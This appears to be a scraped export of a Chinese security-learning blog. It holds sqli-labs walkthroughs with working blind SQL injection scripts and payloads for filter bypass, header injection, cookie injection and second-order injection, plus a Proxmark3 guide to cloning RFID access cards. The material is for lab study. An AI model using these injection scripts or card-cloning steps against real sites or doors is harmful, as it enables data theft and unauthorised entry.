1 url = txt1+str(i)+txt2+str(num13) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): num3 = 1 if(num1 == 1): num = 97 num += 13 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): num += 6 else: num -= 7 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): num += 3 else: num -= 3 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext != txt4): num -= 3 if(reqtext == txt4) and ((num == 106) or (num == 119)): for j in range(num,num+4): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: for j in range(num,num+3): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 if(num1 == 0 and num2 == 1): num = 65 num += 13 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): num += 6 else: num -= 7 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): num += 3 else: num -= 3 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext != txt4): num -= 3 if(reqtext == txt4) and ((num == 74) or (num == 87)): for j in range(num,num+4): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: for j in range(num,num+3): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 if(num2 == 0 and num3 == 1): num =48 num += 5 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): for j in range(num,num+5): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: num -= 5 for j in range(num,num+5): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 第二十四关这道题目考的是二次注入，可以理解为第一滴构造可以注入的条件，第二次才实施注入从源代码上看login.php、login_create.php都被做了过滤//login.php $username = mysql_real_escape_string($_POST[\"login_user\"]); $password = mysql_real_escape_string($_POST[\"login_password\"]); //login_create.php $username= mysql_escape_string($_POST['username']) ; $pass= mysql_escape_string($_POST['password']); $re_pass= mysql_escape_string($_POST['re_password']); mysql_real_escape_string的作用–&gt;传送门mysql_escape_string的作用–&gt;传送门只有在pass_change.php的username没有做过滤$username= $_SESSION[\"username\"]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); 假设我们要攻击的用户名为admin，二次注入的方法原理为构造特殊的用户名admin&#39;#，在修改admin&#39;#的用户密码的时候会由于mysql更新语句$sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; 变为UPDATE users SET PASSWORD='pass' where username='admin'#' and password='pass' \"; 这样就可以达到修改admin的密码的目的第一步，构建特殊用户名，密码随意登陆后修改密码，当前密码不用填，因为已经注释掉了这样就可以修改admin的密码了mysql&gt; select * from users; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | 123 | //admin的默认密码是admin | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | | 17 | admin'# | 123 | +----+----------+------------+ 14 rows in set (0.00 sec) 第二十五关过滤and和or首先测试id=1&#39;报错说明存在单引号注入，测试id=1&#39; and &#39;1&#39;=&#39;1返回正常但不是id为1的页面，从下方的提示也可以看到and被过滤掉了测试id=1&#39; anandd &#39;1&#39;=&#39;1返回正常说明and只被过滤了一次只要把and或or双写就可以绕过了还有一种方法是用逻辑运算符代替，用&amp;&amp;代替and,用||代替or 第二十五A关这一关考的是过滤了and和or的盲注，同样过滤了and和or，可以用&amp;&amp;和||代替和双写绕过id=1 anandd if(length(database())&gt;8,sleep(5),sleep(10)) # 实测发现可以不用盲注直接注入id=-1 union select 1,database(),3 第二十六关这关过滤了空格和注释function blacklist($id) &#123; $id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive) $id= preg_replace('/and/i',\"\", $id); //Strip out AND (non case sensitive) $id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /* $id= preg_replace('/[--]/',\"\", $id); //Strip out -- $id= preg_replace('/[#]/',\"\", $id); //Strip out # $id= preg_replace('/[\\s]/',\"\", $id); //Strip out spaces $id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id); //Strip out slashes return $id; &#125; 替换空格的方法有%09 --TAB键（水平） %0a --新建一行 %0c --新的一页 %0d --return %0b --TAB（垂直） %a0 --空格 最后一个会报错，在linux下可以，跟apache解析有关，测试payload为id=-1'%09anandd%09'1'='1 然而测试union语句竟然失败了，经过多次反复测试发现上述替换都会被过滤，id=1&#39;anandd&#39;1&#39;=&#39;1不加空格可以注入成功，网上找到一个盲注的方法，但还是有点缺陷id=1'anandd(ascii(substr(database(),1,1))&gt;=97)anandd'1'='1 有待补充 第二十六A关这一关和上一关一样，只不过sql语句多了括号id=1')anandd(ascii(substr(database(),1,1))&gt;=97)anandd('1'='1 第二十七关过滤了union和select，下面是过滤代码function blacklist($id) &#123; $id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /* $id= preg_replace('/[--]/',\"\", $id); //Strip out --. $id= preg_replace('/[#]/',\"\", $id); //Strip out #. $id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces. $id= preg_replace('/select/m',\"\", $id); //Strip out spaces. $id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces. $id= preg_replace('/union/s',\"\", $id); //Strip out union $id= preg_replace('/select/s',\"\", $id); //Strip out select $id= preg_replace('/UNION/s',\"\", $id); //Strip out UNION $id= preg_replace('/SELECT/s',\"\", $id); //Strip out SELECT $id= preg_replace('/Union/s',\"\", $id); //Strip out Union $id= preg_replace('/Select/s',\"\", $id); //Strip out select return $id; &#125; 对比二十六关过滤空格的代码少了$id= preg_replace('/[\\s]/',\"\", $id); //Strip out spaces $id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id); //Strip out slashes union可以双写绕过也可以大小写绕过，select要三写才可以绕过，或者大小写绕过,%09可以替换空格，猜测二十六关提到的替换方法应该也可以，注释可以用and&#39;1&#39;=&#39;1闭合id=0' uniounionn%09selecselselectectt%091,database(),3%09and '1'='1 id=0'%09UnIoN%09sElEcT%091,database(),3%09and%09'1'='1 第二十七A关和二十七关一样，单引号边双引号，用二十七关的方法即可绕过id=0\"%09UnIoN%09sElEcT%091,database(),3%09and%09\"1\"=\"1 第二十八关这一关过滤了union select，所以要吧这个双写，把过滤代码的注释去掉要再写一次selectid=1')%09uniunion%09selselectectoN%09SeLeCt%091,database(),3%09and%09('1'='1 第二十A关源代码把二十八关前面的都注释了，保留了最后一个function blacklist($id) &#123; //$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /* //$id= preg_replace('/[--]/',\"\", $id); //Strip out --. //$id= preg_replace('/[#]/',\"\", $id); //Strip out #. //$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces. //$id= preg_replace('/select/m',\"\", $id); //Strip out spaces. //$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces. $id= preg_replace('/union\\s+select/i',\"\", $id); //Strip out spaces. return $id; &#125; 直接双写union selectid=1') uniounion selectn select 1,database(),3 and ('1'='1 第二十九关emmm……“This site protected by world’s best Firewall”,really？。感觉一点过滤都没有。。。 第三十关感觉和第二十九关一样id=0\" union select 1,database(),3 and \"1\"=\"1 卒","categories":[],"tags":[{"name":"注入","slug":"注入","permalink":"http://yoursite.com/tags/注入/"},{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"盲注","slug":"盲注","permalink":"http://yoursite.com/tags/盲注/"}]},{"title":"sqli-labs的学习记录二（9-22）","slug":"sqli-labs2","date":"2018-08-03T02:45:53.000Z","updated":"2020-09-18T03:23:29.284Z","comments":true,"path":"2018/08/03/sqli-labs2/","link":"","permalink":"http://yoursite.com/2018/08/03/sqli-labs2/","excerpt":"sqli-labs上的sql注入学习第二部分，上半部分（1-8）→sqli-labs的学习记录一","text":"sqli-labs上的sql注入学习第二部分，上半部分（1-8）→sqli-labs的学习记录一 第九关&emsp;&emsp;布尔盲注是判断对错，第九关是基于时间的盲注，根据返回时间来判断。比如(ascii(substr(database(),1,1))&gt;=97,我们可以让这个判断语句正确延迟5秒返回，如果错误就正常返回。这里用到一个if函数，if（a,b,c）如果a正确就返回b，否则返回c。所以最终payload为id=1' and if(ascii(substr(database(),1,1))&gt;=97,sleep(5),sleep(0)) -- + 然后跟布尔盲注的方法一样一个一个的判断，时间上会比布尔盲注要多，要节省时间可以降低到2秒或者3秒,脚本基本上是抄第八关的，在判断方式上做了变动，思路不变。import requests import time txt1 = \"http://localhost/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),\" txt2 = \",1))&gt;=\" txt3 = \",1))=\" txt4 = \",sleep(2),sleep(0)) -- +\" num11 = 97 num12 = 65 num13 = 48 code = '' num1 = 0 num2 = 0 num3 = 0 for i in range(1,9): url = txt1+str(i)+txt2+str(num11)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): num1 = 1 url = txt1+str(i)+txt2+str(num12)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): num2 = 1 url = txt1+str(i)+txt2+str(num13)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): num3 = 1 if(num1 == 1): num = 97 num += 13 url = txt1+str(i)+txt2+str(num)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): num += 6 else: num -= 7 url = txt1+str(i)+txt2+str(num)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): num += 3 else: num -= 3 url = txt1+str(i)+txt2+str(num)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &lt;=2): num -= 3 if((num == 106) or (num == 119)): for j in range(num,num+4): url = txt1+str(i)+txt3+str(j)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: for j in range(num,num+3): url = txt1+str(i)+txt3+str(j)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 if(num1 == 0 and num2 == 1): num = 65 num += 13 url = txt1+str(i)+txt2+str(num)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): num += 6 else: num -= 7 url = txt1+str(i)+txt2+str(num)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): num += 3 else: num -= 3 url = txt1+str(i)+txt2+str(num)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &lt;=2): num -= 3 if((num == 74) or (num == 87)): for j in range(num,num+4): url = txt1+str(i)+txt3+str(j)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: for j in range(num,num+3): url = txt1+str(i)+txt3+str(j)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 if(num2 == 0 and num3 == 1): num =48 num += 5 url = txt1+str(i)+txt2+str(num)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): for j in range(num,num+5): url = txt1+str(i)+txt3+str(j)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: num -= 5 for j in range(num,num+5): url = txt1+str(i)+txt3+str(j)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 附上截图 第十关也是时间盲注，基于双引号，把单引号变成双引号即可id=1\" and if(ascii(substr(database(),1,1))&gt;=97,sleep(5),sleep(0)) -- + 第十一关第十一关是基于单引号的post型注入，在f12下可以看到表单是post型以及两个参数uname和passwdpost型注入要勾选上post data，最后不要忘记submit=Submit&emsp;&emsp;我在测试时发现我的火狐浏览器的hackbar在post方式下单引号测试excute点击没反应，（对于这个bug真的很迷，也有师兄曾经遇到过），无奈只能切换工具，chrome下的postman，效果也不怎么好，直接换了旧版本的火狐（56.0）继续，在passwd后加个单引号直接报错，后面就跟第一关一样了，post表单payload如下uname=123&amp;passwd=123' union select 1,database() -- +&amp;submit=Submit 第十二关基于双引号的post型注入，跟第十一关一样，单引号替换双引号，测试发现报错，少了括号，payload如下uname=123&amp;passwd=456\") union select 1,database() -- + &amp;submit=Submit 第十三关post型基于单引号的双注入，第五关讲过，直接拿第五关的payloaduname=123&amp;passwd=123') union select count(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables group by a-- + &amp;submit=Submit 一次没成功就多试几次 第十四关post型基于双引号的双注入，跟第十三关一样，payload如下uname=123&amp;passwd=123\" union select count(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables group by a-- + &amp;submit=Submit 第十五关post型单引号盲注，测试布尔型uname=123&amp;passwd=123' or '1'='1 &amp;submit=Submit 测试时间型失败，返回时间异常，经常是几分钟才有有回复，测试失败 第十六关post型双引号盲注和第十五关一样uname=123&amp;passwd=123\") or \"1\"=\"1\" -- + &amp;submit=Submit 第十七关基于错误的更新查询post注入高版本的mysql已经修复了这个bug有兴趣的可以去了解下–&gt;传送门–&gt;传送门–&gt;传送门 第十八关请求头User-Agent注入（需要正确的用户名和密码），需要抓包，抓包工具burpsuit（不会使用的自行百度）先抓包在User-Agent后面加一个单引号User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0' 发现报错，说明可以注入一般这种注入的sql语句都是insert类型，查看index.php的查询关键代码$insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; 因为这种方式注入没有回显，一般是基于时间的insert型盲注，通过判断返回时间来注入user-agent简写成Mozilla/5.0 Firefox/56.0User-Agent: Mozilla/5.0 Firefox/56.0' or sleep(5) or ' 最后要闭合单引号，不可以注释掉（我也不知道原因π_π）5秒后返回正常页面猜测数据库User-Agent: Mozilla/5.0 Firefox/56.0' or if(ascii(substr((select database()),1,1))&gt;97,sleep(5),sleep(0)) or ' 5秒后返回盲注当然是写脚本跑啦,python脚本代码如下，稍微修改了一下之前的代码就可以了import requests import time txt1 = \"Mozilla/5.0 Firefox/56.0' or if(ascii(substr((select database()),\" txt2 = \",1))&gt;=\" txt3 = \",1))=\" txt4 = \",sleep(2),sleep(0)) or '\" key = &#123;'uname':'admin','passwd':'admin','submit':'Submit'&#125; url = \"http://localhost/sqli-labs/Less-18/\" num11 = 97 num12 = 65 num13 = 48 code = '' num1 = 0 num2 = 0 num3 = 0 for i in range(1,9): payload = txt1+str(i)+txt2+str(num11)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): num1 = 1 payload = txt1+str(i)+txt2+str(num12)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): num2 = 1 payload = txt1+str(i)+txt2+str(num13)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): num3 = 1 if(num1 == 1): num = 97 num += 13 payload = txt1+str(i)+txt2+str(num)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): num += 6 else: num -= 7 payload = txt1+str(i)+txt2+str(num)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): num += 3 else: num -= 3 payload = txt1+str(i)+txt2+str(num)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &lt;=2): num -= 3 if((num == 106) or (num == 119)): for j in range(num,num+4): payload = txt1+str(i)+txt3+str(j)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: for j in range(num,num+3): payload = txt1+str(i)+txt3+str(j)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 if(num1 == 0 and num2 == 1): num = 65 num += 13 payload = txt1+str(i)+txt2+str(num)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): num += 6 else: num -= 7 payload = txt1+str(i)+txt2+str(num)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): num += 3 else: num -= 3 payload = txt1+str(i)+txt2+str(num)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &lt;=2): num -= 3 if((num == 74) or (num == 87)): for j in range(num,num+4): payload = txt1+str(i)+txt3+str(j)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: for j in range(num,num+3): payload = txt1+str(i)+txt3+str(j)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 if(num2 == 0 and num3 == 1): num =48 num += 5 payload = txt1+str(i)+txt2+str(num)+txt4 time1 = time.time() req = requests.get(url = url) time2 = time.time() if(time2 - time1 &gt;=2): for j in range(num,num+5): url = txt1+str(i)+txt3+str(j)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: num -= 5 for j in range(num,num+5): payload = txt1+str(i)+txt3+str(j)+txt4 headers = &#123;'User-Agent': payload&#125; time1 = time.time() req = requests.post(url = url,data =key,headers = headers) time2 = time.time() if(time2 - time1 &gt;=2): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 第十九关跟第十八关一样，referer注入，也是insert语句修改请求头Referer: http://localhost/sqli-labs/Less-19/' or if(ascii(substr((select database()),1,1))&gt;97,sleep(5),sleep(0)) or ' 5秒后页面返回正常，脚本参考上面的 第二十关cookie注入，这一关要先登录，登陆后有cookie才可以注入测试单引号，在cookie后面加一个单引号用order by测试有多少列Cookie: uname=admin' order by 4# 查数据库Cookie: uname=admin' union select 1,2,database() limit 1,1# 后面的一样了 ————————-2018-08-10更新————————- 第二十一关用admin，admin登陆后抓包看到cooieCookie: uname=YWRtaW4%3D url解码后YWRtaW4=，用base64尝试解码得到admin，那么cookie应该就是用了base64加密过的，和第二十关一样，多了base64加密，Cookie: uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgbGltaXQgMSwxIw%3D%3D 第二十二关和第二十一关一样，单引号变双引号YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSBsaW1pdCAxLDEj 第一部分 完、","categories":[],"tags":[{"name":"注入","slug":"注入","permalink":"http://yoursite.com/tags/注入/"},{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"盲注","slug":"盲注","permalink":"http://yoursite.com/tags/盲注/"}]},{"title":"Proxmark3 Easy破解门禁卡学习过程","slug":"proxmark3","date":"2018-07-26T10:28:38.000Z","updated":"2020-09-18T03:25:13.595Z","comments":true,"path":"2018/07/26/proxmark3/","link":"","permalink":"http://yoursite.com/2018/07/26/proxmark3/","excerpt":"前言&emsp;&emsp;安全不仅仅包含网络上的安全，在我们实际生活中也同样存在很多个安全相关的事物，可以说跟科技扯上关系的事物都会有安全问题，无线，蓝牙，手机，无人机，汽车。真正有问题的不是安全，而是人心。很多事物的设计之初都是没有考虑安全问题的，因为人心的不坏好意迫使去考虑它的安全问题。","text":"前言&emsp;&emsp;安全不仅仅包含网络上的安全，在我们实际生活中也同样存在很多个安全相关的事物，可以说跟科技扯上关系的事物都会有安全问题，无线，蓝牙，手机，无人机，汽车。真正有问题的不是安全，而是人心。很多事物的设计之初都是没有考虑安全问题的，因为人心的不坏好意迫使去考虑它的安全问题。 硬件准备破解设备Proxmark3 Easy破解工具不一定是Proxmark3 Easy，只要是还能够获取和修改卡片数据的设备都可以，比如arc122u，arc122u只能读取和修改高频卡，有点不足 各种卡准备一些ID，IC卡这不都长一个样么（＃－.－） 区分ID卡和IC卡的方法 光照法圆形大多是ID卡，方形大多是IC卡 NFC法拿一部带有NFC功能的手机打开NFC，卡片靠近手机会响的是IC卡，不会响的是ID卡 知识准备&emsp;&emsp;首先，门禁卡所用到的技术是RFID，具体详情可以看这里–&gt;传送门，首先从频率上可以分为高频（13.56MHZ）和低频两种类型的卡，在这两个频率上又会分为多种类型的卡。常见的卡的有 table th:first-of-type { width: 25%; } table th:nth-of-type(2) { width: 7%; } table th:nth-of-type(3) { width: 68%; } 类型 频率 特性 Mifare S50(简称M1) 高频 最常见的卡，每张卡有独一无二的UID号，可保存修改数据,常见学生卡，饭卡，公交卡，门禁卡 Mifare UltraLight（简称M0） 高频 低成本卡，出厂固化UID，可储存修改数据，常见地铁卡，公交卡 Mifare UID（简称UID卡） 高频 M1卡的变异版本，可修改UID，国外叫做中国魔术卡，可以用来克隆M1 S50的数据 EM4XX（简称ID卡） 低频 常用固化ID卡，出厂固化ID，只能读不能写（低成本门禁卡，小区门禁卡，停车场门禁卡） T5577（简称可修改ID卡） 低频 可用来克隆ID卡，出厂为空卡，内有三区也可储存数据，个别三区科设置密码 HID ProxⅡ（简称HID卡） 低频 美国常用的低频卡，可擦写，不与其他卡通用 高频M1 S50卡&emsp;&emsp;目前最常见的高频卡，也是我们口中俗称的IC卡。M1卡科储存的数据大小为8k，分为16个扇区，每个扇区分4个块，每个块为16个字节，以块为存取单位。每个扇区都有独立的一组密码及访问控制，每张卡有唯一的一个32位的序列号。每个扇区的0,1,2块为数据块，用来存储数据，第3块为控制块，包括了密A、存取控制、密码B每张卡的第0扇区的第0块用来春芳厂商代码，不可更改。扇区0 03332801198804008500b42ef0bb6aa8 块0 //厂商代码，不可更改 00000000000000000000000000000000 块1 //数据块 00000000000000000000000000000000 块2 //数据块 ffffffffffffff078069ffffffffffff 块3 //密码A（6字节），存储控制（4字节），密码B（6字节） 扇区1 00000000000000000000000000000000 块4 //出了第0扇区稍有不同，其他15个扇区结构完全一样 00000000000000000000000000000000 块5 00000000000000000000000000000000 块6 ffffffffffffff078069ffffffffffff 块7 . . . 扇区15 00000000000000000000000000000000 块60 00000000000000000000000000000000 块61 00000000000000000000000000000000 块62 ffffffffffffff078069ffffffffffff 块63 &emsp;&emsp;中间4字节控制字是管理密码权限，用来设置A密码和B密码的功能。默认不修改的时候，可以用A密码读写所有数据。A密码不可读出，B密码可以用A密码读出。密码不一定可以读取，由控制字决定。 M1 UID卡&emsp;&emsp;M1 UID卡是针对M1 S50卡特制的变种卡，用起来和M1 S50完全一样，只是多了一个功能，就是0扇区块的数据可以随意修改。因此UID号也可以随意修改，厂家信息也可以随意修改。UID卡修改0扇区0块数据是靠指令进入工厂模式，可以直接对全卡任何数据编辑，不需要密码即可读写卡，同时不怕写坏卡，即使写错0块，写坏扇区控制字，也可以随时修复回来，不影响后续使用。 FUID卡&emsp;&emsp;FUID卡是针对UID卡做的优化。新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID卡，因此可以来拒绝UID卡的访问，来达到屏蔽复制卡的功能。FUID可以修改0块，但只可以修改一次，写错也没办法更改，也不能重复利用。修改后和M1卡完全一样，很难被屏蔽检测。 CUID卡&emsp;&emsp;CUID卡是针对FUID卡做的优化。CUID卡可以重复修改0块，但是它和UID卡的区别是，UID卡是通过指令修改0块，CUID使用的是常规密码验证的方法写0块，其他扇区和标准M1卡相同。缺点是，还是有可能会被检测出来，而且如果不小心写错了UID号的校验位导致无法读卡，没办法修复只能报废。 低频ID卡&emsp;&emsp;ID卡是我们的俗称，内部芯片的全名叫做EM4100或EM41XX。每张卡出厂就有独一无二的ID号，不可改写。 T5577卡&emsp;&emsp;T5577 卡是一种可以写入数据可以加密的低频卡。最特别之处是，写入ID号可以变身成为ID卡，写入HID号可以变身HID卡，写入Indala卡号，可以变身Indala卡。T5577一共有8个块，每个块只能存8位数。第0块是用来设置卡片类型和调制方式的，决定了卡片是ID卡还是HID卡，如果随意修改会导致读不到卡。最后一个块，在没有加密时是数据区，加密后，其数据就变成了密码。结构如下0x00148040 00000000000101001000000001000000 [0] 0xFF94C004 11111111100101001100000000000100 [1] 0xA5464942 10100101010001100100100101000010 [2] 0xFFFFF808 11111111111111111111100000001000 [3] 0x0001C000 00000000000000011100000000000000 [4] 0x0001C000 00000000000000011100000000000000 [5] 0x0001C000 00000000000000011100000000000000 [6] 0x0001C000 00000000000000011100000000000000 [7] 破解破解ID卡安装驱动驱动下载官网网址–&gt;传送门安装驱动文件前需要禁用驱动安装强制签名，方法–&gt;传送门驱动安装方法我的电脑右键–&gt;管理–&gt;设备管理器–&gt;端口下的设备右键–&gt;更新驱动程序–&gt;浏览我的计算机–&gt;选择本地–&gt;从磁盘安装–找到官方的驱动文件–&gt;确认驱动安装完成会显示图片上的样子，记住COM端口 硬件使用方法Proxmark3 Easy 1 功能按钮 2 ABCD工作状态指示灯 3 USB接口 4 电源指示灯 5 低频读卡区 6 高频读卡区 &emsp;&emsp;功能按钮有退出、取消、停止、强刷固件的功能，ABCD指示灯作为设备运行的依据，闪烁说明正在进行，完全熄灭或者常亮代表攻击失败、等待。全部熄灭表示已经停止运行了，直接重新拔插设备。 破解方法读卡片ID号→换上T5577卡→把ID号写入卡片→完成ID是没有密码只有卡号的，因此只要知道卡号就可以复制。软件资料包–&gt;密码: f8q4打开官方软件固件\\pm3-bin-2.5.0\\win32(client+GUI)\\Proxmark Tool.exe，箭头所指选择刚刚驱动安装的那个COM端口，连接Proxmark3，接入电脑后，电源指示灯处POW亮蓝灯，FULL亮绿灯，CHR闪烁微弱红灯。在COMMAND TO SEND里输入hw tune测试天线谐振电压，高频超过5V，低频超过10V就可以正常使用。proxmark3&gt; hw tune Measuring antenna characteristics, please wait........ # LF antenna: 22.27 V @ 125.00 kHz # LF antenna: 31.76 V @ 134.00 kHz # LF optimal: 31.76 V @ 133.33 kHz # HF antenna: 20.17 V @ 13.56 MHz Displaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz. 把低频ID卡（门禁卡）放到低频读卡区输入lf search获取ID卡的信息，把卡号抄下来，复制时要用proxmark3&gt; lf search Reading 30000 bytes from device memory Data fetched Samples @ 8 bits/smpl, decimation 1:1 NOTE: some demods output possible binary if it finds something that looks like a tag False Positives ARE possible Checking for known tags: EM410x pattern found: EM TAG ID : 0000001450 //ID卡号，这个抄下来，如果是HID卡会显示HID Unique TAG ID : 000000280A Possible de-scramble patterns HoneyWell IdentKey &#123; DEZ 8 : 00005200 DEZ 10 : 0000005200 DEZ 5.5 : 00000.05200 DEZ 3.5A : 000.05200 DEZ 3.5B : 000.05200 DEZ 3.5C : 000.05200 DEZ 14/IK2 : 00000000005200 DEZ 15/IK3 : 000000000010250 DEZ 20/ZK : 00000000000002080010 &#125; Other : 05200_000_00005200 Pattern Paxton : 1331792 [0x145250] Pattern 1 : 16652 [0x410C] Pattern Sebury : 5200 0 5200 [0x1450 0x0 0x1450] Valid EM410x ID Found! //卡的类型 把T5577卡放到低频读卡区，输入命令lf hid clone 0000001450proxmark3&gt; lf hid clone 0000001450 Cloning tag with ID 000001450 proxmark3&gt; proxmark3&gt; #db# DONE! 上述命令在左上方的命令树中都可以找到，左边有一些按钮和命令的介绍ID卡复制就完成了效果如下 破解IC卡IC卡破解思路获取任意扇区的密钥 PRNG 漏洞攻击得 0 扇区密匙 默认密码扫描获得密匙 嗅探读卡机和卡片交互数据获得密匙 模拟成 M1 卡刷卡后捕获密匙（挑读卡机，兼容性不好） 